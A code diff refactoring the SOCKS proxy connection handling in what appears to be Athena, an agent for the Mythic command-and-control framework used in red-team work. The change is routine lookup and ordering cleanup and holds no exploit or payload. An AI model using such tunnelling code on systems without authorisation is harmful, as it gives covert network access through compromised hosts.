@@ -82,26 +82,27 @@ namespace Athena.Commands.Model
         /// <param name="sm">Socks Message</param>
         public async Task HandleMessage(SocksMessage sm)
         {
-            AthenaSocksConnection conn;
-            if (!this.connections.TryGetValue(sm.server_id, out conn)){
+
+            if (!this.connections.ContainsKey(sm.server_id))
+            {
                 await HandleNewConnection(sm);
                 return;
             }
 
-            if (!conn.IsConnectedOrConnecting())
+            if (!this.connections[sm.server_id].IsConnectedOrConnecting())
             {
-                await RemoveConnection(conn.server_id);
+                await RemoveConnection(sm.server_id);
 
                 await SocksResponseHandler.AddSocksMessageAsync(new SocksMessage()
                 {
-                    server_id = conn.server_id,
+                    server_id = sm.server_id,
                     data = "",
                     exit = true
                 });
                 return;
             }
 
-            conn.client.Connection.Send(Misc.Base64DecodeToByteArray(sm.data));
+            this.connections[sm.server_id].client.Connection.Send(Misc.Base64DecodeToByteArray(sm.data));
         }
 
         /// <summary>
@@ -120,7 +121,7 @@ namespace Athena.Commands.Model
 
                 ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
 
-                if(co.ip is null || co.port == 0) //Couldn't resolve IP address
+                if (co.failed)
                 {
                     ReturnMessageFailure(co.server_id);
                     return;
@@ -128,24 +129,15 @@ namespace Athena.Commands.Model
 
                 AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect.
                 sc.HandleSocksEvent += ReturnSocksMessage;
-
-                await AddConnection(sc); //Add our connection to the Dictionary;
                 sc.client.Start();
-            }
+                await AddConnection(sc); //Add our connection to the Dictionary;
+                
+            } 
             catch (Exception e)
             {
                 ReturnMessageFailure(sm.server_id);
             }
         }
-
-        /// <summary>
-        /// Add a message to the out queue to be returned to the Mythic server
-        /// </summary>
-        /// <param name="sm">Socks Message</param>
-        //public void ReturnMessage(SocksMessage sm)
-        //{
-        //    this.messagesOut.Add(sm);
-        //}
 
         public async void ReturnMessageFailure(int id)
         {
@@ -153,7 +145,7 @@ namespace Athena.Commands.Model
             {
                 server_id = id,
                 exit = true,
-                data = await Misc.Base64Encode(new ConnectResponse
+                data = Misc.Base64Encode(new ConnectResponse
                 {
                     bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                     bndport = new byte[] { 0x00, 0x00 },
